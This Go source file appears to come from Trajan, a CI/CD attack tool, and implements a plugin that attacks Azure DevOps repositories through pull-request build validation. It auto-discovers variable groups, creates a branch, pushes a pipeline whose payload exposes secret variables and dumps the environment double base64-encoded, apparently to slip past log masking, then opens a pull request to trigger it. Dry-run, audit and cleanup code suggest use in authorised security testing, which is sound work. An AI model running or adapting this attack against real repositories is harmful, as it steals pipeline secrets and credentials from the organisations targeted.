package prattack

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-pr-attack", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements PR-based pipeline execution attack on Azure DevOps
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new ADO PR attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-pr-attack",
			"Trigger malicious pipeline via pull request build validation on Azure DevOps",
			"azuredevops",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if PR attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnPullRequestSecretsExposure) ||
		common.FindingHasType(findings, detections.VulnTriggerExploitation)
}

// Execute performs the PR attack on Azure DevOps
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Parse project/repo - use opts.Target.Value to get the string
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	branchName := fmt.Sprintf("trajan-pr-attack-%s", opts.SessionID)
	pipelinePath := "azure-pipelines-pr-attack.yml"

	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would create PR attack on Azure DevOps"
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  pipelinePath,
				Description: "PR attack pipeline YAML",
			},
		}
		return result, nil
	}

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get repository to find default branch
	repository, err := client.GetRepository(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	defaultBranch := repository.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "refs/heads/main"
	}
	// Strip refs/heads/ prefix
	defaultBranch = strings.TrimPrefix(defaultBranch, "refs/heads/")

	// Auto-discover variable groups in the project
	var discoveredGroups []azuredevops.VariableGroup
	groups, err := client.ListVariableGroups(ctx, project)
	if err != nil {
		// Non-fatal: log and continue without variable groups
		fmt.Printf("Warning: failed to list variable groups: %v\n", err)
	} else {
		discoveredGroups = groups
	}

	// Generate pipeline YAML with discovered variable groups
	pipelineYAML := generatePRAttackYAML(discoveredGroups)

	// Get commit ID for default branch
	branches, err := client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var commitID string
	refName := "refs/heads/" + defaultBranch
	for _, branch := range branches {
		if branch.Name == refName {
			commitID = branch.ObjectID
			break
		}
	}

	if commitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find default branch: %s", defaultBranch)
		return result, fmt.Errorf("branch not found: %s", defaultBranch)
	}

	// Create attack branch
	err = client.CreateBranch(ctx, project, repo, branchName, commitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	branches, err = client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var newBranchCommitID string
	newRefName := "refs/heads/" + branchName
	for _, branch := range branches {
		if branch.Name == newRefName {
			newBranchCommitID = branch.ObjectID
			break
		}
	}

	if newBranchCommitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find new branch: %s", branchName)
		return result, fmt.Errorf("branch not found: %s", branchName)
	}

	// Push malicious pipeline YAML to branch
	err = client.PushFile(ctx, project, repo, branchName, pipelinePath, pipelineYAML, "Add PR validation pipeline", newBranchCommitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to push pipeline file: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  pipelinePath,
		Description: "PR attack pipeline YAML pushed",
	})

	// Create pull request
	prReq := azuredevops.PullRequestCreateRequest{
		SourceRefName: "refs/heads/" + branchName,
		TargetRefName: "refs/heads/" + defaultBranch,
		Title:         fmt.Sprintf("Trajan PR Attack %s", opts.SessionID),
		Description:   "Testing PR-based pipeline execution",
	}

	pr, err := client.CreatePullRequest(ctx, project, repo, prReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create pull request: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactPR,
		Identifier:  strconv.Itoa(pr.PullRequestID),
		Description: fmt.Sprintf("Pull request #%d created", pr.PullRequestID),
	})

	result.Success = true
	result.Message = fmt.Sprintf("PR attack created: Pull request #%d will trigger build validation pipeline if configured", pr.PullRequestID)
	result.Data = map[string]interface{}{
		"branch":          branchName,
		"pipeline_path":   pipelinePath,
		"pull_request_id": pr.PullRequestID,
		"project":         project,
		"repo":            repo,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactPR,
			Identifier:  strconv.Itoa(pr.PullRequestID),
			Action:      "abandon",
			Description: "Abandon pull request",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	// We need project/repo from target
	project, repo, err := common.ParseProjectRepo(session.Target.Value)
	if err != nil {
		return err
	}

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactPR:
				// Parse PR ID from string identifier
				prID, err := strconv.Atoi(action.Identifier)
				if err != nil {
					return fmt.Errorf("parsing PR ID %s: %w", action.Identifier, err)
				}

				// Abandon the pull request
				if err := client.AbandonPullRequest(ctx, project, repo, prID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("PR #%d already abandoned or doesn't exist\n", prID)
						continue
					}
					return fmt.Errorf("abandoning PR #%d: %w", prID, err)
				}

			case attacks.ArtifactBranch:
				// Get branch commit ID for deletion
				branches, err := client.ListGitBranches(ctx, project, repo)
				if err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("listing branches for deletion: %w", err)
				}

				var commitID string
				refName := "refs/heads/" + action.Identifier
				for _, branch := range branches {
					if branch.Name == refName {
						commitID = branch.ObjectID
						break
					}
				}

				if commitID == "" {
					fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
					continue
				}

				if err := client.DeleteBranch(ctx, project, repo, action.Identifier, commitID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}

// generatePRAttackYAML generates the PR attack pipeline YAML with variable groups
func generatePRAttackYAML(groups []azuredevops.VariableGroup) string {
	yaml := `trigger: none

pool:
  vmImage: 'ubuntu-latest'

`

	// Add variable groups if discovered
	if len(groups) > 0 {
		yaml += common.GenerateVariableGroupsYAML(groups)
	}

	// Payload
	payload := `steps:
  - script: |
      echo "=== PR Attack - Trajan ==="
      echo "Build.Reason: $(Build.Reason)"
      echo "System.PullRequest.PullRequestId: $(System.PullRequest.PullRequestId)"
      env | sort | while read line; do
        echo "$line" | base64 | base64
      done
    displayName: 'Execute Payload'
`

	// Add env block for secret variables (appended after displayName as step-level property)
	if len(groups) > 0 {
		envBlock := common.GenerateSecretEnvYAML(groups)
		if envBlock != "" {
			payload += envBlock
		}
	}

	return yaml + payload
}
